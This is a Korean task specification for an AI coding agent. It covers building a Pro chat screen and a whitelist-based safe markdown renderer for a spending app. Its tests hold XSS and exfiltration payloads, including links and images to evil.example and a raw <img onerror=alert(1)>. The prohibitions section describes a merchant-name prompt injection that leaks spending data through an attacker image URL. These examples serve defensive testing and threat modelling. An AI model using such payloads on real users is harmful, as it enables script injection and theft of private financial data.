# Step 4: chat-ui

## 읽어야 할 파일

먼저 아래 파일들을 읽고 프로젝트의 아키텍처와 설계 의도를 파악하라:

- `/CLAUDE.md` (CRITICAL: 마크다운은 요소 허용 목록으로 렌더링, `img`·`a` 금지)
- `/docs/ARCHITECTURE.md` (API 표의 `POST /api/chat`, 에러 코드 → `apiFetch` 처리)
- `/docs/USER_FLOWS.md` (AI 예외: 채팅, "가맹점명 injection → 마크다운 요소 제한으로 무력화"), `/docs/UI_GUIDE.md` (입력 필드, 버튼, AI 고지 한 줄)
- `/src/lib/domain/chat.ts` (`CHAT_EXAMPLES`, `CHAT_LIMITS`, `ChatTurn`, `normalizeHistory`) (Step 1, 3)
- `/src/app/api/chat/route.ts`, `/src/server/actions/chat.ts` (Step 3 — 요청·응답 형태 확인)
- `/src/server/queries/plan.ts` (`getViewerPlan`, Step 0), `/src/components/pro/pro-lock.tsx` (Step 1), `/src/components/ui/ai-disclaimer.tsx` (Step 2)
- `/src/components/ui/api-fetch.ts` (`apiFetch`, `ApiError`, `redirectPathForError`)
- `node_modules/react-markdown/lib/index.d.ts` (`allowedElements`, `unwrapDisallowed`, `skipHtml`)

## 작업

Pro 사용자의 채팅 화면과 안전한 마크다운 렌더러를 만든다. 대화는 React state + 이 탭의 `sessionStorage`에만 둔다. TDD로 진행한다(각 파일 `.test.tsx`, jsdom).

### 1. `src/components/ui/safe-markdown.tsx`
```tsx
export const SAFE_MARKDOWN_ELEMENTS = ['p', 'strong', 'em', 'ul', 'ol', 'li', 'code', 'table', 'thead', 'tbody', 'tr', 'th', 'td', 'br'] as const;
export function SafeMarkdown({ text }: { text: string }): React.ReactElement
```
- `react-markdown`에 `allowedElements={SAFE_MARKDOWN_ELEMENTS}`, `unwrapDisallowed`(허용 안 된 요소는 글자만 남김), `skipHtml`. `rehype-raw`·`remark-gfm`은 쓰지 않는다(설치돼 있지 않고 추가도 금지 — 표 문법은 글자로 보인다. 시스템 프롬프트가 표를 쓰지 않게 한다).
- 본문 스타일: `text-sm text-body leading-relaxed`, 목록 들여쓰기, `code`는 `tabular-nums`.
- 테스트(보안 핵심): `[클릭](https://evil.example)` → `a` 없음·"클릭" 글자는 남음, `![x](https://evil.example/p.png?q=secret)` → `img` 없음·DOM 어디에도 `evil.example` 없음, 원시 HTML `<img src=x onerror=alert(1)>`·`<script>`·`<iframe>` → 요소 없음, `# 제목` → `h1` 없음, `**굵게**` → `strong`. 검사는 `container.querySelectorAll('a,img,script,iframe,h1,h2')`가 0개인지로 한다.

### 2. `src/components/chat/*` (client, props만)
- `message-list.tsx`: `{ messages: ChatTurn[]; loading: boolean }` → 사용자 메시지는 일반 텍스트(`whitespace-pre-wrap`), 답변은 `SafeMarkdown`. 로딩 중 "답을 찾고 있어요…"(`aria-live="polite"`). 빈 목록이면 아무것도 그리지 않는다.
- `example-questions.tsx`: `{ examples: readonly string[]; onPick?: (q: string) => void; disabled?: boolean }` → `onPick`이 있으면 칩 버튼, 없으면 읽기 전용 목록(티저용).
- `chat-input.tsx`: `{ value; onChange; onSubmit; disabled }` → textarea(`maxLength={CHAT_LIMITS.messageMax}`), "123/500" 카운터(`tabular-nums`), [보내기]. Enter 전송·Shift+Enter 줄바꿈, **한글 IME 조합 중(`isComposing`) Enter는 무시**. 공백뿐이거나 로딩 중이면 비활성.
- `chat-panel.tsx`: `{ examples: readonly string[] }`
  - state `messages: ChatTurn[]`. 마운트 시 `sessionStorage['finsight.chat.v1']`에서 복원(try/catch, 형태가 틀리면 버림), 바뀔 때마다 저장. [대화 지우기]는 state와 storage를 모두 비운다.
  - 전송: 사용자 메시지를 먼저 표시 → `apiFetch<{ text: string }>('/api/chat', { method: 'POST', body: { history: normalizeHistory(이전 messages), message } })` → 답변 추가.
  - 에러: `redirectPathForError(code, '/chat')`가 경로를 주면(`UNAUTHENTICATED`·`CONSENT_REQUIRED`·`PRO_REQUIRED`) `window.location.assign`. `RATE_LIMITED` → "오늘 질문 한도를 다 썼어요. 내일 다시 시도해 주세요." `AI_UNAVAILABLE`·`NETWORK` → "답을 만들지 못했어요." + [다시 시도](같은 질문 재전송, 중복 표시 없음). 그 외 `ApiError.message`.
  - 대화가 비어 있으면 `ExampleQuestions`(칩 클릭 = 바로 전송).
  - 아래에 `AiDisclaimer`와 한 줄: "대화는 이 탭에만 잠시 보관되고 서버에 저장되지 않아요."
- `chat-teaser.tsx`: `{ examples }` → "Pro에서 내 지출에 대해 물어볼 수 있어요" + 읽기 전용 예시 질문 + `ProLock`.
- 테스트(`@/components/ui/api-fetch`의 `apiFetch`만 mock, `redirectPathForError`는 실제 사용): 칩 클릭 전송, 전송 body의 `history`가 정규화됨, 501자 입력 불가, 로딩 표시, `RATE_LIMITED` 문구, `PRO_REQUIRED` → `/pricing` 이동, 다시 마운트해도 대화 유지, [대화 지우기], 답변 속 링크·이미지가 요소로 렌더되지 않음.

### 3. `src/app/(app)/chat/page.tsx`
- `getViewerPlan()` → `isPro`면 `<ChatPanel examples={CHAT_EXAMPLES} />`, 아니면 `<ChatTeaser examples={CHAT_EXAMPLES} />`. 제목 "지출 Q&A". 로직 없음.

## Acceptance Criteria

```bash
npm run lint
npm run build
npm run test
```

## 검증 절차

1. 위 AC 커맨드를 실행한다.
2. 아키텍처 체크리스트를 확인한다:
   - AI 텍스트가 `SafeMarkdown` 외의 경로(`dangerouslySetInnerHTML` 등)로 렌더되지 않는가? `a`·`img`가 허용 목록에 없는가?
   - 채팅 컴포넌트가 `/api/chat`만 호출하고 Claude·Supabase를 직접 부르지 않는가?
   - Free 화면이 채팅 API를 호출하지 않는가(Pro 판단은 서버, 화면 분기는 UX용)?
3. 결과에 따라 `phases/3-pro/index.json`의 해당 step을 업데이트한다:
   - 성공 → `"status": "completed"`, `"summary": "산출물 한 줄 요약"`
   - 수정 3회 시도 후에도 실패 → `"status": "error"`, `"error_message": "구체적 에러 내용"`
   - 사용자 개입 필요 → `"status": "blocked"`, `"blocked_reason": "구체적 사유"` 후 즉시 중단

## 금지사항

- `a`·`img`를 허용하거나 `rehype-raw`·`urlTransform` 우회로 링크를 살리지 마라. 이유: 가맹점명 prompt injection이 `![](https://공격자/?q=지출내역)` 같은 이미지·링크로 데이터를 빼낼 수 있다(CLAUDE.md CRITICAL).
- 새 npm 패키지(`remark-gfm`, `rehype-sanitize` 등)를 설치하지 마라. 이유: 새 의존성 금지 규칙. 허용 목록 + `skipHtml`로 충분하다.
- 대화를 `localStorage`·쿠키·DB에 저장하지 마라. 이유: 채팅 기록은 탭 세션에만 둔다(ADR-007). 다른 사람이 같은 기기를 써도 남지 않게 한다.
- 스트리밍 UI(타자 효과 등)를 흉내 내지 마라. 이유: 응답은 비스트리밍이고, 불필요한 애니메이션은 UI 가이드 위반이다.
- 이모지·말풍선 아이콘 장식을 넣지 마라. 이유: `docs/UI_GUIDE.md` 안티패턴.
- 기존 테스트를 깨뜨리지 마라.
